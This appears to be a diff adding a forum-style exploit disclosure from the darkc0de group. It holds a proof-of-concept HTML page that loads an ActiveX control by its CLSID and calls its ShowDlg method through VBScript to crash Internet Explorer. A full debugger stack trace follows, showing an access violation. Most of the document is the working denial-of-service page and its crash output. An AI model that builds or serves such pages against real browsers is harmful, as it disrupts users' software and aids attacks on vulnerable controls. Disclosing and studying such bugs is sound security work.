@@ -1,0 +1,84 @@
+################################################################ 
+#       .___             __          _______       .___        # 
+#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
+#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
+#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
+#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
+#        \/                  \/             \/                 # 
+#                   ___________   ______  _  __                # 
+#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
+#                 \  \___|  | \/\  ___/\     /                 # 
+#                  \___  >__|    \___  >\/\_/                  # 
+#      est.2007        \/            \/   forum.darkc0de.com   # 
+################################################################ 
+# Greetz to all Darkc0de ,AI, AH,ICW Memebers
+#Shoutz to r45c4l,j4ckh4x0r,silic0n,smith,baltazar,d3hydr8,FB1H2S, lowlz,Eberly,Sumit,zerocode,dalsim,7, Anirban , Anas, Navneet ,Varun, Dilip, Manish
+#Special Thanks to r45c4l for allowing analysis on his product
+
+#RegKey Safe for Script: False
+#RegKey Safe for Init: False
+
+#Implements IObjectSafety: True 
+
+<html>
+Test DoS Page
+<object classid='clsid:CDF8A044-74AF-4045-AE13-D8AEDF802538' id='target' ></object>
+<script language='vbscript'>
+arg1=String(1, "A")
+target.ShowDlg arg1 
+</script>
+
+
+Access violation exception (0xC0000005) when trying to read from memory location 0x00000020 in the thread below.
+
+Function     					Arg 1     Arg 2     Arg 3   Source 
+TargetControl+145d0     			0000000f     00000000     00000000    
+mfc80u!CWnd::WindowProc+22 			0000000f     00000000     00000000    
+mfc80u!AfxCallWndProc+a3    			00000000     003008d0     0000000f    
+mfc80u!AfxWndProc+35     			003008d0     0000000f     00000000    
+TargetControl!DllGetClassObject+c1a2     	003008d0     0000000f     00000000    
+user32!InternalCallWinProc+28     		05987d5f     003008d0     0000000f    
+user32!UserCallWinProcCheckWow+150     		03c6a110     05987d5f     003008d0    
+user32!DispatchClientMessage+a3     		0068d978     0000000f     00000000    
+user32!__fnDWORD+24     0013debc     		00000018     0068d978    
+ntdll!KiUserCallbackDispatcher+13     		7e42aedc     003e08f6     0000005e    
+user32!NtUserCallHwndLock+c     		003e08f6     0694e16c     0013df74    
+mfc80u!CWnd::RunModalLoop+77     		00000004     4aba760d     00000000    
+mfc80u!CDialog::DoModal+129     		4ab791a2     05540874     00000000    
+TargetControl+ef9f     0694db40    		0000001c     00000004    
+oleaut32!CTypeInfo2::Invoke+234     		03c7491c     0694db40     00000000    
+TargetControl+11c58     0694db40     		00000001     00000409    
+mshtml!COleSite::ContextInvokeEx+149     	0414b6f0     00000001     00000409    
+mshtml!COleSite::ContextThunk_InvokeEx+44     	0414b6f0     00000001     00000409    
+vbscript!IDispatchExInvokeEx2+a9     		0003b8d8     0414ce50     00000001    
+vbscript!IDispatchExInvokeEx+56     		0003b8d8     0414ce50     00000001    
+vbscript!InvokeDispatch+101     		0003b8d8     0003b990     00000001    
+vbscript!InvokeByName+42     			0003b8d8     0414ce50     00000001    
+vbscript!CScriptRuntime::RunNoEH+234c     	0013e6a4     4aab5064     00000000    
+vbscript!CScriptRuntime::Run+62     		0013e6a4     0003fd08     0003b8d8    
+vbscript!CScriptEntryPoint::Call+51     	0013e6a4     00000000     00000000    
+vbscript!CSession::Execute+c8     		0003fd08     0013e888     00000000    
+vbscript!COleScript::ExecutePendingScripts+144  0013e888     0013e868     0003e454    
+vbscript!COleScript::ParseScriptTextCore+243    0414cd54     0414a394     00000000    
+vbscript!COleScript::ParseScriptText+2b     	0003e454     0414cd54     0414a394    
+mshtml!CScriptCollection::ParseScriptText+1da   0414ca90     73301e34     00000000    
+mshtml!CScriptElement::CommitCode+1e1     	00000000     00000000     00000000    
+mshtml!CScriptElement::Execute+a4     		0414a520     06194d97     00000000    
+mshtml!CHtmParse::Execute+41     		0414a5e0     0414a520     7dcc4b65    
+mshtml!CHtmPost::Broadcast+d     		7dcc4b83     06194d97     0414a520    
+mshtml!CHtmPost::Exec+32b     			06194d97     0414a520     04140810    
+mshtml!CHtmPost::Run+12     			06194d97     04140810     06194ccf    
+mshtml!PostManExecute+51     			04140810     06194d97     0414a520    
+mshtml!PostManOnTimer+76     			00250938     00000113     00001003    
+user32!InternalCallWinProc+28     		7dcfb9d8     00250938     00000113    
+user32!UserCallWinProc+f3     			00000000     7dcfb9d8     00250938    
+user32!DispatchMessageWorker+10e     		0013eb90     00000000     0013eb78    
+user32!DispatchMessageW+f     			0013eb90     00000000     00163468    
+browseui!TimedDispatchMessage+33     		0013eb90     0013ee98     00000000    
+browseui!BrowserThreadProc+336     		00162ca8     0013ee98     00162ca8    
+browseui!BrowserProtectedThreadProc+50     	00162ca8     00162ca8     00000000    
+browseui!SHOpenFolderWindow+22c     		00162ca8     00000000     00000000    
+shdocvw!IEWinMain+133     			001523ba     00000001     0140d0b8    
+iexplore!WinMainT+2de     			00400000     00000000     001523ba    
+iexplore!_ModuleEntry+99     			0140d0b8     00000018     7ffdf000    
+kernel32!BaseProcessStart+23     		00402451     00000000     78746341    
